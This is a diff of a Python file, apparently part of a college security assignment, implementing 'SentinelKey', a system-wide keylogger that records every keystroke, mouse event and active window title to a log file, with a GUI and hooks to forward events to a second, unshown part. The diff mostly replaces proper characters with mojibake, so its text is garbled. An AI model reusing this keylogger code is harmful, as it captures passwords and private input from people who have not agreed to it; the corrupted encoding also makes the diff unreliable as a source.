@@ -1,15 +1,16 @@
+﻿# feature/window-tracker — Win32 active window detection
 """
-sentinel_key.py — PART 1: Global keystroke + mouse logger with window tracking.
+sentinel_key.py â€” PART 1: Global keystroke + mouse logger with window tracking.
 
 Captures EVERY keyboard and mouse event system-wide and logs which application
 window is active when each event occurs.
 
 Events captured:
-  Window    — active application name + title whenever focus changes
-  Keyboard  — every key press and release
-  Mouse     — every movement coordinate, every click, every scroll tick
+  Window    â€” active application name + title whenever focus changes
+  Keyboard  â€” every key press and release
+  Mouse     â€” every movement coordinate, every click, every scroll tick
 
-College cybersecurity assignment — run only on systems you own.
+College cybersecurity assignment â€” run only on systems you own.
 """
 
 import os
@@ -25,7 +26,7 @@ from pynput.keyboard import Key
 
 import config
 
-# ── Globals ───────────────────────────────────────────────────────────────────
+# â”€â”€ Globals â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 _running         = False
 _paused          = False
 _waiting_for_esc = config.START_ON_ESC
@@ -44,18 +45,18 @@ _feed_widget  = None
 _status_label = None
 _win_label    = None      # shows current active window in GUI
 
-# External hooks — main.py patches these to forward events to Part 2
+# External hooks â€” main.py patches these to forward events to Part 2
 on_key_event_hook   = None
 on_mouse_event_hook = None
 
 
-# ── Timestamp ─────────────────────────────────────────────────────────────────
+# â”€â”€ Timestamp â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 def _ts() -> str:
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
 
 
-# ── File write ────────────────────────────────────────────────────────────────
+# â”€â”€ File write â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 def _write(line: str) -> None:
     with _write_lock:
@@ -69,13 +70,13 @@ def _write(line: str) -> None:
 def _init_log() -> None:
     with _write_lock:
         with open(config.KEYLOG_FILE, "w", encoding="utf-8") as f:
-            f.write("SENTINELKEY — PART 1: COMPLETE INPUT LOG\n")
+            f.write("SENTINELKEY â€” PART 1: COMPLETE INPUT LOG\n")
             f.write(f"Started : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
             f.write("Captures: Window focus + ALL keystrokes + ALL mouse events\n")
             f.write("=" * 70 + "\n")
 
 
-# ── Active window detection (Windows API) ─────────────────────────────────────
+# â”€â”€ Active window detection (Windows API) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 def _get_active_window() -> str:
     """Return the title of the foreground window using the Win32 API."""
@@ -107,8 +108,8 @@ def _window_watcher() -> None:
             if win and win != _current_window:
                 with _current_window_lock:
                     _current_window = win
-                _write(f"[{_ts()}] [WINDOW] ▶ {win}")
-                _gui_append(f"\n── WINDOW: {win} ──\n", "window")
+                _write(f"[{_ts()}] [WINDOW] â–¶ {win}")
+                _gui_append(f"\nâ”€â”€ WINDOW: {win} â”€â”€\n", "window")
                 if _win_label:
                     try:
                         _win_label.configure(text=f"Active: {win[:80]}")
@@ -117,7 +118,7 @@ def _window_watcher() -> None:
         time.sleep(0.2)
 
 
-# ── GUI helper ────────────────────────────────────────────────────────────────
+# â”€â”€ GUI helper â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 def _gui_append(text: str, tag: str = "") -> None:
     if _feed_widget is None:
@@ -131,7 +132,7 @@ def _gui_append(text: str, tag: str = "") -> None:
         pass
 
 
-# ── Keyboard callbacks ────────────────────────────────────────────────────────
+# â”€â”€ Keyboard callbacks â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 def _on_press(key) -> bool | None:
     global _running, _waiting_for_esc, _paused, total_keys
@@ -153,7 +154,7 @@ def _on_press(key) -> bool | None:
         _gui_append("[SYSTEM] Stopped.\n", "info")
         if _status_label:
             try:
-                _status_label.configure(text="● STOPPED", fg="#f85149")
+                _status_label.configure(text="â— STOPPED", fg="#f85149")
             except Exception:
                 pass
         return False
@@ -208,7 +209,7 @@ def _on_release(key) -> None:
     _write(f"[{_ts()}] KEY_RELEASE {ks:<20} | window={win}")
 
 
-# ── Mouse callbacks ───────────────────────────────────────────────────────────
+# â”€â”€ Mouse callbacks â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 def _on_move(x: int, y: int) -> None:
     global total_mouse
@@ -232,7 +233,7 @@ def _on_click(x: int, y: int, button, pressed: bool) -> None:
     with _current_window_lock:
         win = _current_window
     _write(f"[{_ts()}] MOUSE_CLICK  {action}  btn={btn}  x={x}  y={y}  | window={win}")
-    _gui_append(f"[CLK] {btn} {'↓' if pressed else '↑'} ({x},{y})\n", "mouse")
+    _gui_append(f"[CLK] {btn} {'â†“' if pressed else 'â†‘'} ({x},{y})\n", "mouse")
 
     if on_mouse_event_hook and pressed:
         try:
@@ -253,7 +254,7 @@ def _on_scroll(x: int, y: int, dx: int, dy: int) -> None:
     _gui_append(f"[SCR] {direction} ({x},{y})\n", "mouse")
 
 
-# ── GUI ───────────────────────────────────────────────────────────────────────
+# â”€â”€ GUI â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 def _build_gui() -> None:
     global _root, _feed_widget, _status_label, _win_label, _running, _paused
@@ -272,18 +273,18 @@ def _build_gui() -> None:
     DIM  = "#8b949e"
 
     _root = tk.Tk()
-    _root.title("SentinelKey — Full Input Capture")
+    _root.title("SentinelKey â€” Full Input Capture")
     _root.geometry("960x600")
     _root.configure(bg=BG)
 
-    # ── Header ────────────────────────────────────────────────────────────────
+    # â”€â”€ Header â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     hdr = tk.Frame(_root, bg=BG2)
     hdr.pack(fill="x")
-    tk.Label(hdr, text="  SentinelKey — Keystroke, Mouse & Window Tracker",
+    tk.Label(hdr, text="  SentinelKey â€” Keystroke, Mouse & Window Tracker",
              font=("Segoe UI", 13, "bold"), fg=BLU, bg=BG2).pack(side="left", pady=10)
     _status_label = tk.Label(
         hdr,
-        text="● WAITING" if config.START_ON_ESC else "● CAPTURING",
+        text="â— WAITING" if config.START_ON_ESC else "â— CAPTURING",
         font=("Segoe UI", 10, "bold"),
         fg=YEL if config.START_ON_ESC else GRN,
         bg=BG2,
@@ -291,7 +292,7 @@ def _build_gui() -> None:
     _status_label.pack(side="right", padx=16)
     tk.Frame(_root, bg="#30363d", height=1).pack(fill="x")
 
-    # ── Active window banner ──────────────────────────────────────────────────
+    # â”€â”€ Active window banner â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     win_frame = tk.Frame(_root, bg="#0e1825")
     win_frame.pack(fill="x", padx=0, pady=0)
     tk.Label(win_frame, text="  ACTIVE APP:",
@@ -301,7 +302,7 @@ def _build_gui() -> None:
     _win_label.pack(side="left", pady=4, fill="x", expand=True)
     tk.Frame(_root, bg="#30363d", height=1).pack(fill="x")
 
-    # ── Stats bar ─────────────────────────────────────────────────────────────
+    # â”€â”€ Stats bar â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     stats_frame = tk.Frame(_root, bg=BG2)
     stats_frame.pack(fill="x", padx=8, pady=2)
     _keys_var  = tk.StringVar(value="Keys: 0")
@@ -310,7 +311,7 @@ def _build_gui() -> None:
              font=("Consolas", 9), fg=GRN, bg=BG2).pack(side="left", padx=8)
     tk.Label(stats_frame, textvariable=_mouse_var,
              font=("Consolas", 9), fg=BLU, bg=BG2).pack(side="left", padx=8)
-    tk.Label(stats_frame, text=f"→ {os.path.abspath(config.KEYLOG_FILE)}",
+    tk.Label(stats_frame, text=f"â†’ {os.path.abspath(config.KEYLOG_FILE)}",
              font=("Consolas", 8), fg=DIM, bg=BG2).pack(side="right", padx=8)
 
     def _tick():
@@ -322,7 +323,7 @@ def _build_gui() -> None:
             pass
     _tick()
 
-    # ── Controls ──────────────────────────────────────────────────────────────
+    # â”€â”€ Controls â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     ctrl = tk.Frame(_root, bg=BG)
     ctrl.pack(fill="x", padx=8, pady=4)
 
@@ -330,7 +331,7 @@ def _build_gui() -> None:
         global _paused
         _paused = not _paused
         _status_label.configure(
-            text="● PAUSED" if _paused else "● CAPTURING",
+            text="â— PAUSED" if _paused else "â— CAPTURING",
             fg=YEL if _paused else GRN,
         )
         _pause_btn.configure(text="Resume" if _paused else "Pause")
@@ -344,7 +345,7 @@ def _build_gui() -> None:
         global _running
         _running = False
         _write(f"[{_ts()}] [SYSTEM] Stopped via GUI")
-        _status_label.configure(text="● STOPPED", fg=RED)
+        _status_label.configure(text="â— STOPPED", fg=RED)
         _gui_append("\n[SYSTEM] Logging stopped.\n", "info")
 
     def _on_close():
@@ -372,7 +373,7 @@ def _build_gui() -> None:
               bg=RED, fg=FG, font=("Segoe UI", 10, "bold"),
               relief="flat", padx=14, pady=5, cursor="hand2").pack(side="right")
 
-    # ── Feed ──────────────────────────────────────────────────────────────────
+    # â”€â”€ Feed â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
     feed_frame = tk.Frame(_root, bg=BG)
     feed_frame.pack(fill="both", expand=True, padx=8, pady=(0, 8))
 
@@ -391,7 +392,7 @@ def _build_gui() -> None:
     _feed_widget.tag_configure("window",  foreground=PRP,
                                 font=("Consolas", 10, "bold"))
 
-    _gui_append(f"[SYSTEM] Logging → {os.path.abspath(config.KEYLOG_FILE)}\n", "info")
+    _gui_append(f"[SYSTEM] Logging â†’ {os.path.abspath(config.KEYLOG_FILE)}\n", "info")
     _gui_append("[SYSTEM] Window, key and mouse events all captured.\n", "info")
     if config.START_ON_ESC:
         _gui_append("[SYSTEM] Press ESC to begin.\n", "info")
@@ -402,17 +403,17 @@ def _build_gui() -> None:
     _root.mainloop()
 
 
-# ── Console fallback ──────────────────────────────────────────────────────────
+# â”€â”€ Console fallback â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 def _run_console() -> None:
     global _running
     print("=" * 60)
-    print("  SentinelKey — Full Input Capture (console mode)")
+    print("  SentinelKey â€” Full Input Capture (console mode)")
     print(f"  Log: {os.path.abspath(config.KEYLOG_FILE)}")
     if config.START_ON_ESC:
         print("  Press ESC to START")
     else:
-        print("  Capturing NOW — press ESC to stop")
+        print("  Capturing NOW â€” press ESC to stop")
     print("=" * 60)
     try:
         while _running or _waiting_for_esc:
@@ -422,7 +423,7 @@ def _run_console() -> None:
         _write(f"[{_ts()}] [SYSTEM] Stopped (Ctrl+C)")
 
 
-# ── Entry point ───────────────────────────────────────────────────────────────
+# â”€â”€ Entry point â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
 def main() -> None:
     global _running
@@ -464,8 +465,9 @@ def main() -> None:
 
     kb_listener.stop()
     ms_listener.stop()
-    _write(f"[{_ts()}] [SYSTEM] Done — keys={total_keys}  mouse={total_mouse}")
+    _write(f"[{_ts()}] [SYSTEM] Done â€” keys={total_keys}  mouse={total_mouse}")
 
 
 if __name__ == "__main__":
     main()
+
